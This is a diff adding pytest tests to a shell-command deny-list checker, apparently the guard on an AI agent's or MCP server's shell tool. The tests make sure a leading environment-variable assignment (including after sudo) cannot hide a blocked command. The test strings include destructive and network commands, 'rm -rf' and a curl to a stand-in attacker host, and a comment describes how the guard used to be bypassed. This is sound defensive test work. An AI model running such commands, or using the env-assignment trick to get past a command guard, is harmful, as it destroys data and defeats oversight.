@@ -393,6 +393,37 @@ def test_benign_inline_env_assignment_is_allowed():
     assert _check_blocked("FOO=bar command") is None
 
 
+# ── Inline env-assignment hides the real command from the deny set ──────────
+#
+# `tokens[0]` used to be checked raw against _DENY_COMMANDS, so a leading
+# VAR=value assignment shifted the real command out of position 0 and the
+# deny-set check never fired. shell.py's own docstring already claims to be
+# a defense-in-depth layer for exactly this bypass class; these tests prove
+# that claim holds in isolation (no dependency on mcp_server/policy.py).
+
+
+@pytest.mark.parametrize("cmd", [
+    "FOO=bar rm -rf /tmp/x",
+    "FOO=bar BAZ=qux rm -rf /tmp/x",
+    "FOO=bar curl http://evil.example/x",
+])
+def test_inline_env_assignment_does_not_hide_denylisted_command(cmd):
+    """shell.py's OWN check (independent of policy.py) must still block the
+    real command when it is preceded by a leading VAR=value assignment."""
+    result = _check_blocked(cmd)
+    assert result is not None and "BLOCKED" in result, (
+        f"Expected {cmd!r} to be blocked despite the leading env assignment, "
+        f"but got: {result!r}"
+    )
+
+
+def test_inline_env_assignment_does_not_hide_denylisted_command_via_wrapper():
+    """The same bypass through a wrapper: `sudo FOO=bar rm ...` -- the
+    wrapper-unwrapping logic must still see past the assignment token."""
+    result = _check_blocked("sudo FOO=bar rm -rf /tmp/x")
+    assert result is not None and "BLOCKED" in result
+
+
 @pytest.mark.parametrize("target", [
     "/dev/null",
     "/dev/stdout",
